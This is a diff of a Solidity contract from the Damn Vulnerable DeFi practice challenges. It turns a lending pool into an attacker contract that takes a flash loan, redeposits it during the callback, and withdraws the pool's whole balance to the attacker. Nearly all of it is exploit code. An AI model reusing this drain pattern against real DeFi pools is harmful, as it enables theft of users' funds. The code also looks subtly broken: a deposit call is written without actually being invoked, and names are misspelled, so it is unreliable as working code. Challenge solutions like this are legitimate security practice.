@@ -3,6 +3,14 @@ pragma solidity 0.8.12;
 
 import {Address} from "openzeppelin-contracts/utils/Address.sol";
 
+interface ISideEntranceLenderPool {
+    function deposit(uint256 amount) external payable;
+
+    function withdraw() external;
+
+    function flashLoan(uint256 amount) external;
+}
+
 /**
  * @title SideEntranceLenderPool
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
@@ -10,30 +18,33 @@ import {Address} from "openzeppelin-contracts/utils/Address.sol";
 contract FlashLoanReciever {
     using Address for address payable;
 
-    mapping(address => uint256) private balances;
+    address private _vulnerableContract;
+    address private _attacker;
 
     error NotEnoughETHInPool();
     error FlashLoanHasNotBeenPaidBack();
 
-    function deposit() external payable {
-        balances[msg.sender] += msg.value;
+    constructor(address vulnerableContract) {
+        _vulnerableContract = vulnerableContract;
+        _attacker = msg.sender;
+    }
+
+    function deposit(uint256 amount) public payable {
+        ISideEntranceLenderPool(_vulnerableContract).deposit{value: amount};
     }
 
     function withdraw() external {
-        uint256 amountToWithdraw = balances[msg.sender];
-        balances[msg.sender] = 0;
-        payable(msg.sender).sendValue(amountToWithdraw);
+        require(msg.sender == _attacker, "don't be too sneaky");
+        ISideEntranceLenderPool(_vulnerableContract).withdraw();
+        payable(msg.sender).sendValue(address(this).balance);
     }
 
-    function revieve() external {
-        
+    function execute(uint256 amount) external {
+        require(msg.sender == _vulnerableContract, "don't be too greddy");
+        deposit(amount);
     }
 
     function flashLoan(uint256 amount) external {
-        uint256 balanceBefore = address(this).balance;
-        if (balanceBefore < amount) revert NotEnoughETHInPool();
-
-        if (address(this).balance < balanceBefore)
-            revert FlashLoanHasNotBeenPaidBack();
+        ISideEntranceLenderPool(_vulnerableContract).flashLoan(amount);
     }
 }
